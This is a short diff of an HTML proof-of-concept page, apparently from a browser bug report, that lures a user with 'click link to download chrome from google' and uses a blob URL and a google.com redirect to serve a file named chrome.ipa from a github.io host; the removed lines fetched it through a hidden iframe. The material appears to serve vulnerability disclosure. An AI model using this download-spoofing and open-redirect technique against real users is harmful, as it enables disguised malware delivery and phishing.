@@ -1,14 +1,7 @@
-
 <h1>click link to download chrome from google</h1><a href="#" id="poc" onclick="poc()">link</a>
 <script>
     function poc(){
-        var html = '<iframe id="ifr" src style="display:none"></iframe>\n' +
-            '<script>\n' +
-            '    function poc(){\n' +
-            '        document.getElementById("ifr").src="https://www.google.com/url?q=https://ybt01.github.io/upload/chrome.ipa&sa=D&source=buganizer&usg=AOvVaw1n11p_TFqts82Sku-62RSv";\n' +
-            '    }\n' +
-            '    poc();\n' +
-            '<\/script>';
+        var html = '<a href="https://www.google.com/url?q=https://ybt01.github.io/upload/chrome.ipa&sa=D&source=buganizer&usg=AOvVaw1n11p_TFqts82Sku-62RSv">link</a>';
         var blob = new Blob([html], {type: "text/html"});
         var url = URL.createObjectURL(blob);
         window.location.href = url;
